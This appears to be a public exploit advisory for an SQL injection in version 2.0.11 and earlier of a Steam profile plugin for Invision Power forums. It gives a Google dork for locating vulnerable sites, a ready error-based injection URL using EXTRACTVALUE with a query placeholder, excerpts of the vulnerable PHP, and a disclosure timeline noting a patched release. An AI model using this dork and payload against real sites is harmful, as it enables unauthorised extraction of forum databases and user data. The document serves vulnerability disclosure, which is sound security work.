# Google Dork: inurl:tab=node_steam_steamprofile
# Date: 13/03/2017
# Exploit Author: DrWhat
# Vendor Homepage: https://invisionpower.com/files/file/8170-steam-profile-integration/
# Software Link: https://invisionpower.com/files/file/8170-steam-profile-integration/
# Version: 2.0.11 and below
# Tested on: Windows Server 2008 PHP7 & Linux Debian PH5.6
 
# SQL Injection/Exploit: http://localhost/path/index.php?app=steam&module=steam&section=steamProfile&do=update&id=[USER_WITH_STEAM]%&#039; OR EXTRACTVALUE(1001,CONCAT(0x3A,([QUERY]),0x3A)) AND &#039;%&#039;=&#039;&csrfKey=[CSRF_KEY]
 
 
# Vulnerable code: /sources/Update/Update.php updateProfile() function
# 532: $ids = array();
# 533: $steamids = &#039;&#039;;
# 534: $select = "s.st_member_id,s.st_steamid,s.st_restricted";
# 535: $where = "s.st_steamid>0 AND s.st_restricted!=&#039;1&#039;";
# 536: if($single)
# 537: {
# 538:    $where .= " AND s.st_member_id=&#039;{$single}&#039;"; // $single is $_GET[&#039;id&#039;] pass through the router
# 539:
# 540:    /* Is the member already in the database ? */
# 541:    $s = \IPS\steam\Profile::load($single); // IPS Profile model cleans the request and successfully executes the query
 
 
# 573: $query = \IPS\Db::i()->select( $select, array(&#039;steam_profiles&#039;, &#039;s&#039;), $where, &#039;s.st_member_id ASC&#039;, array( $this->extras[&#039;profile_offset&#039;], 100), NULL, NULL, &#039;011&#039;); // Our payload is then later executed in the $where variable unsanitized
 
 
# Timeline
# 13/03/2017: Exploit discovered
# 13/03/2017: Vendor notified
# 14/03/2017: Vendor confirmed vulnerablity
# 15/03/2017: Vendor releases patch 2.0.12
# 15/03/2017: Public disclosure

